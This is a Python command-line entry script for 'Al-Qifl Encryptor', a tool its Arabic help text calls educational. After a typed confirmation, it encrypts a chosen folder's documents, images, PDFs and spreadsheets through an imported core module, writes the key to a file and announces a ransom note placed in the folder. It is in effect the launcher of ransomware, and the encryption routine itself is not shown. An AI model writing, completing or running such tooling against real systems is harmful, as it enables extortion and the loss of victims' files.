import argparse
import os
from Al_Qifl.encryptor import core

DEFAULT_EXTENSIONS = [".txt", ".jpg", ".jpeg", ".png", ".pdf", ".docx", ".xlsx"]

def main():
    parser = argparse.ArgumentParser(description="Al-Qifl Encryptor - أداة تشفير تعليمية")
    parser.add_argument("directory", help="المجلد المستهدف للتشفير")
    parser.add_argument("--key-file", default="key.key", help="مسار حفظ ملف المفتاح (الافتراضي: key.key)")
    parser.add_argument("--ext", nargs='+', default=DEFAULT_EXTENSIONS, help=f"قائمة الامتدادات المستهدفة (الافتراضي: {DEFAULT_EXTENSIONS})")

    args = parser.parse_args()

    if not os.path.isdir(args.directory):
        print(f"خطأ: المجلد '{args.directory}' غير موجود.")
        return

    print(f"تحذير: سيتم تشفير الملفات في المجلد '{args.directory}'.")
    print("هذه العملية لا يمكن التراجع عنها بدون مفتاح التشفير.")
    confirm = input("هل أنت متأكد أنك تريد المتابعة؟ (نعم/لا): ")

    if confirm.lower() == 'نعم':
        try:
            encrypted_count = core.encrypt_target_directory(args.directory, args.key_file, args.ext)
            print(f"\nاكتمل التشفير بنجاح.")
            print(f"تم تشفير {encrypted_count} ملف.")
            print(f"تم حفظ مفتاح التشفير في: {args.key_file}")
            print(f"تم إنشاء رسالة الفدية في: {os.path.join(args.directory, core.RANSOM_NOTE_FILENAME)}")
            print("\nمهم: احتفظ بملف المفتاح في مكان آمن. لا يمكن فك التشفير بدونه.")
        except Exception as e:
            print(f"حدث خطأ أثناء عملية التشفير: {e}")
    else:
        print("تم إلغاء العملية.")

if __name__ == "__main__":
    main()
